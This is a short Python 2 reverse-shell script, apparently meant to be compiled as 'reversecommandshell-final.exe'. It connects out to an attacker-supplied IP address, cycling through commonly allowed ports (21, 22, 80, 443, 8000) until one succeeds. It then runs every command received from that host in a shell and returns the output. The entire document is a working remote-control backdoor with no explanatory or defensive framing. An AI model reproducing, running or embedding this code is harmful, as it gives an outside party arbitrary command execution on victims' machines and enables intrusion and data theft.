import sys,socket,time,subprocess

if len(sys.argv)<=1:
    print "Please specify an IP Address.\n\n"
    print "reversecommandshell-final.exe <IP ADDRESS>"
    sys.exit(0)

print "it started"
mysocket=socket.socket()
connected=False
while not connected:
    for port in [21,22,80,443,8000]:
        time.sleep(1)
        try:
            print "Trying",port,
            mysocket.connect((sys.argv[1],port))
        except socket.error:
            print "Nope"
            continue
        else:
            print "Connected"
            connected=True
            break
while True:
    commandrequested=mysocket.recv(1024)
    prochandle = subprocess.Popen(commandrequested,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    prochandle.wait()
    results = prochandle.stdout.read() + prochandle.stderr.read() 
    mysocket.send(results)
